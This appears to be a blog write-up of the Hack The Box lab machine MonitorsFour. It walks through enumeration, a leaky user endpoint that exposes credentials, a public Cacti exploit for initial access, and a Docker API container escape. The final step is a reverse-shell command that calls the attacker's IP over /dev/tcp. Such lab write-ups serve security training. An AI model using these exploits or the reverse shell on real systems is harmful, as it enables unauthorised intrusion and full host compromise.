---
date: 2026-05-20T06:30:27-05:00
# description: ""
image: "/images/HTB-Eighteen/MonitorsFour.png"
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Windows", "cacti", "CVE-2025-24367", "container-escape", "CVE-2025-9074", "docker", "docker-api"]
categories: ["Red Teaming"]
title: "HTB: MonitorsFour"
type: "post"
---

* Platform: Hack The Box
* Link: [MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
* Level: Easy
* OS: Windows
---

# Scanning

```
nmap -p- --open -T4 -sCV -oA nmap/MonitorsFour {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 07:57 EDT
Nmap scan report for 10.129.48.141
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.01 seconds
```

Nmap finds two open ports:
- 80 (http) with a nginx web server, and a redirection to `monitorsfour.htb`

```
sudo echo "{IP} monitorsfour.htb" | sudo tee -a /etc/hosts
```

- 5985 which is the default port for WinRM

# Enumeration

Visiting `http://monitorsfour.htb/` we find a website for a network monitoring solution.

![MonitorsFour website](/images/HTB-MonitorsFour/monitorsfour_web.png)

The web application does not present any exploitable paths so we move on to directory enumeration.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://monitorsfour.htb
```

![MonitorsFour website](/images/HTB-MonitorsFour/monitors4_gobuster.png)

A directory named `/.env` is discovered. We access it at `http://monitorsfour.htb/.env`.

![MonitorsFour env](/images/HTB-MonitorsFour/monitors4_env.png)

A file is downloaded. It contains database credentials however we are not able to use it currently.

Next is subdomain enumeration.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ic -fs 138
```

![MonitorsFour subdomain enumeration](/images/HTB-MonitorsFour/monitors4_ffuf.png)

At `http://cacti.monitorsfour.htb` we find an instance of [cacti](https://www.cacti.net/) with version `1.2.28`.

![MonitorsFour cacti version](/images/HTB-MonitorsFour/cacti_version.png)

Credentials are needed to login, we return to the main website and take a look at the additional endpoints. `/user` seems interesting, trying to access it leads to an error because of a missing `token` parameter.

![MonitorsFour user directory](/images/HTB-MonitorsFour/monitors4_user.png)

We test the logic and both random value and empty token fail.

```
curl "http://monitorsfour.htb/user?token=AAAA"

curl "http://monitorsfour.htb/user?token="
```

![token tests](/images/HTB-MonitorsFour/token_tests.png)

Further testing reveals `0` as a valid value for `token`

```
ffuf -u 'http://monitorsfour.htb/user?token=FUZZ' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac
```

![user endpoint fuzing](/images/HTB-MonitorsFour/user-fuzz.png)

Sending a request returns user credentials.

```
curl "http://monitorsfour.htb/user?token=0
```

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

The admin password is recovered: `wonderful1`.

![marcus password](/images/HTB-MonitorsFour/marcus_pwd.png)

Using `admin:wonderful1` we login into the main website and access the dashboard.

![MonitorsFour dashboard](/images/HTB-MonitorsFour/monitorsfour_dashboard.png)

The same credentials do not work on the cacti instance, but `marcus:wonderful1` work.

![cacti login](/images/HTB-MonitorsFour/cacti_monitors4.png)

We access the dashboard.

![cacti dashboard](/images/HTB-MonitorsFour/cacti_dashboard.png)

# Initial Foothold

Poking around the dashboard does not reveal anything exploitatble. Searching for cacti vulnerabilities leads to `CVE-2025-24367` with a PoC available [here](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).

**Environment Prep**

```
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git

cd CVE-2025-24367-Cacti-PoC

python3 -m venv myvenv

source myvenv/bin/activate
```

**Vulnerability Exploitation**

```
sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i <ATTACKER_IP> -l <LISTERNER_PORT>
```

![CVE-2025-24367](/images/HTB-MonitorsFour/cacti_exploit.png)

![MonitorsFour foothold](/images/HTB-MonitorsFour/foothold.png)

The hostname is noteworthy, this is a typical container ID. The target is a Windows machine but we are currently in a Linux container, the user flag is in `/home/marcus`.

![user flag location](/images/HTB-MonitorsFour/MonitorsFour_userflag.png)

# Privilege Escalation

We need to escape the container and to access the host system.

Let's collect some network information

![network data](/images/HTB-MonitorsFour/network_data.png)

`172.18.0.1` is the Docker bridge gateway / host-side Docker interface and `192.168.65.7` is the upstream DNS or external host reachable from Docker.

A common escape technique is abusing the API so let's check it.

```
curl http://192.168.65.7:2375/version
```

![Docker API version](/images/HTB-MonitorsFour/Docker_API_version.png)

Enumeration of the Docker networking configuration revealed an exposed Docker Remote API accessible at `192.168.65.7:2375`. Querying the `/version` endpoint confirmed unauthenticated access to the Docker daemon. The response identified the environment as Docker Engine Community running on a WSL2-backed Linux kernel (`6.6.87.2-microsoft-standard-WSL2`).

We enumerate the Docker images

```
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

![Docker images enumeration](/images/HTB-MonitorsFour/docker_enum.png)

There are three Docker images available on the Docker host. Through research we find that `version 28.3.2` (found after querrying `/version`) correspond to Docker Desktop 4.43.x or newer. Searching for `Docker Desktop 4.43.x cve` we find `CVE-2025-9074`, a vulnerability allowing local containers to execute privileged commands on the host via the Docker Engine API. 

A PoC is available [here](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). The command below will create a new container  

```
./cve-2025-9074.sh 192.168.65.7 'bash -c "bash -i >& /dev/tcp/10.10.14.48/9001 0>&1"' 2375
```

![RCE cve_2025_9074](/images/HTB-MonitorsFour/rce_cve_2025_9074.png)

A shell is created on the listener and we can read the root flag at `/host_root/mnt/host/c/Users/Administrator/Desktop/root.txt`.

![Root flag location](/images/HTB-MonitorsFour/MonitorsFour_rootflag.png)


